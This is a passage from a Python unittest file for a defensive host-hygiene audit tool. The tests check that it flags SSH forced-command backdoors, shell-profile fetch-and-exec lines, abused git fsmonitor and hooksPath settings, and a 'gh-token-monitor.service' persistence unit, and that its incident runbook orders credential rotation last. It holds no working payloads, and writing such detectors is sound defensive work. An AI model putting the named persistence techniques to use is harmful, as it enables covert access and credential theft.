        with self._with_config([("core.hookspath", "/opt/acme/tmp/githooks")]):
            self.assertEqual([(i.id, i.severity) for i in hygiene.check_git_config_execution()],
                             [("git-hookspath-set", "info")])

    def test_hookspath_with_nul_byte_does_not_crash(self):
        # An embedded-NUL path value must degrade gracefully (Path.stat raises ValueError, not OSError).
        with self._with_config([("core.hookspath", "a\x00b/hooks")]):
            issues = hygiene.check_git_config_execution()   # must not raise
        self.assertIsInstance(issues, list)

    def test_git_config_decodes_leniently(self):
        # A config value with a non-locale-decodable byte must not crash the audit (errors="replace").
        captured = {}
        def fake_run(cmd, **kw):
            captured.update(kw)
            return mock.Mock(returncode=0, stdout="core.pager\0")
        with mock.patch.object(hygiene.subprocess, "run", side_effect=fake_run):
            hygiene.mechanism._git_global_config()
        self.assertEqual(captured.get("errors"), "replace")


class TestMechanismPersistenceComposition(unittest.TestCase):
    """The three new probes must flow through the single audit() composition site (#1161), and
    their active-compromise findings must lead the rotate-LAST runbook."""

    def _only(self, name, sentinel):
        # Mock every OTHER check to [] so audit() yields just the sentinel deterministically.
        others = {"check_credentials", "check_vscode", "check_branch_protection",
                  "check_persistence", "check_runner_persistence", "check_host_artifacts",
                  "check_ssh_authorized_keys", "check_shell_profile",
                  "check_git_config_execution"} - {name}
        ctx = [mock.patch.object(hygiene, o, return_value=[]) for o in others]
        ctx.append(mock.patch.object(hygiene, name, return_value=[sentinel]))
        return ctx

    def test_audit_composes_each_new_probe(self):
        for name, sid in [("check_ssh_authorized_keys", "ssh-authorized-keys-forced-command"),
                          ("check_shell_profile", "shell-profile-fetch-exec"),
                          ("check_git_config_execution", "git-fsmonitor-command")]:
            sentinel = hygiene.HygieneIssue(sid, "warning", "T", "D", "F")
            patches = self._only(name, sentinel)
            for p in patches:
                p.start()
            try:
                ids = [i.id for i in hygiene.audit()]
            finally:
                for p in patches:
                    p.stop()
            self.assertIn(sid, ids)

    def test_active_backdoor_ids_trigger_incident_runbook(self):
        for sid in ("ssh-authorized-keys-forced-command", "shell-profile-fetch-exec",
                    "git-fsmonitor-command", "git-hookspath-unsafe", "git-config-fetch-exec"):
            out = hygiene.render([hygiene.HygieneIssue(sid, "warning", "T", "D", "F")]).lower()
            self.assertIn("rotate last", out, sid)
            self.assertLess(out.index("isolate the host"), out.index("rotate credentials"), sid)

    def test_hardening_only_findings_do_not_trigger_runbook(self):
        # Loose perms / info are hardening, not proof of live compromise → no rotate-LAST lead.
        for sid in ("ssh-dir-writable", "ssh-authorized-keys-writable",
                    "ssh-authorized-keys-restricted", "git-hookspath-set"):
            out = hygiene.render([hygiene.HygieneIssue(sid, "warning", "T", "D", "F")])
            self.assertNotIn("respond in THIS order", out, sid)


class TestBranchProtection(unittest.TestCase):
    def test_noop_without_slug_or_token(self):
        self.assertEqual(hygiene.check_branch_protection(None, "t"), [])
        self.assertEqual(hygiene.check_branch_protection("o/r", None), [])

    def test_unprotected_branch_warns(self):
        with mock.patch("stayawake.core.adapters.github_api.get_branch_protection",
                        return_value=None):
            issues = hygiene.check_branch_protection("o/r", "tok")
        self.assertEqual([i.id for i in issues], ["branch-unprotected"])

    def test_worm_guard_not_required_warns(self):
        prot = {"required_status_checks": {"contexts": ["build", "lint"]}}
        with mock.patch("stayawake.core.adapters.github_api.get_branch_protection",
                        return_value=prot):
            issues = hygiene.check_branch_protection("o/r", "tok")
        self.assertEqual([i.id for i in issues], ["worm-guard-not-required"])

    def test_worm_guard_required_is_clean(self):
        prot = {"required_status_checks": {"contexts": ["Worm Guard — block infected merges"]}}
        with mock.patch("stayawake.core.adapters.github_api.get_branch_protection",
                        return_value=prot):
            self.assertEqual(hygiene.check_branch_protection("o/r", "tok"), [])


class TestAuditRender(unittest.TestCase):
    def test_render_clean(self):
        self.assertIn("no issues", hygiene.render([]))

    def test_render_lists_issues(self):
        issue = hygiene.HygieneIssue("x", "warning", "Title", "Detail", "Fix")
        out = hygiene.render([issue])
        self.assertIn("Title", out)          # title, detail and the fix line all render
        self.assertIn("Detail", out)
        self.assertIn("→ fix", out)
        self.assertIn("Fix", out)

    def test_credential_exposure_only_is_calm_not_full_runbook(self):
        # Proportionality: a lone credential EXPOSURE (no active persistence) gets a calm note, NOT the
        # isolate-and-rebuild runbook — while keeping the don't-bulk-rotate-first (wiper) caveat.
        out = hygiene.render([hygiene.HygieneIssue("git-credentials-plaintext", "warning", "T", "D", "F")])
        self.assertIn("no active host persistence", out.lower())       # honest: exposure, not compromise
        self.assertIn("bulk credential rotation", out.lower())         # keeps the wiper caveat
        self.assertNotIn("Isolate the host from the network", out)     # NOT the full incident runbook
        self.assertNotIn("Take self-hosted CI runners offline", out)

    def test_credential_plus_persistence_still_gets_full_runbook(self):
        # SAFETY: when active persistence accompanies the exposure, the FULL rotate-LAST runbook must
        # lead — the calm credential note must never suppress a real-compromise response.
        out = hygiene.render([
            hygiene.HygieneIssue("git-credentials-plaintext", "warning", "T", "D", "F"),
            hygiene.HygieneIssue("self-hosted-runner-persistence", "warning", "T", "D", "F")])
        self.assertIn("Isolate the host from the network", out)
        self.assertIn("Active host persistence detected", out)
        self.assertNotIn("no active host persistence", out.lower())

    def test_render_omits_incident_sequence_for_non_trigger_issue(self):
        issue = hygiene.HygieneIssue("vscode-autotasks-on", "warning", "T", "D", "F")
        self.assertNotIn("respond in THIS order", hygiene.render([issue]))

    def test_incident_response_sequence_orders_rotation_last(self):
        joined = " ".join(hygiene.incident_response_sequence()).lower()
        self.assertLess(joined.index("isolate"), joined.index("rotate"))
        self.assertLess(joined.index("neutralize"), joined.index("rotate"))
        self.assertIn("gh-token-monitor.service", joined)


if __name__ == "__main__":
    unittest.main()
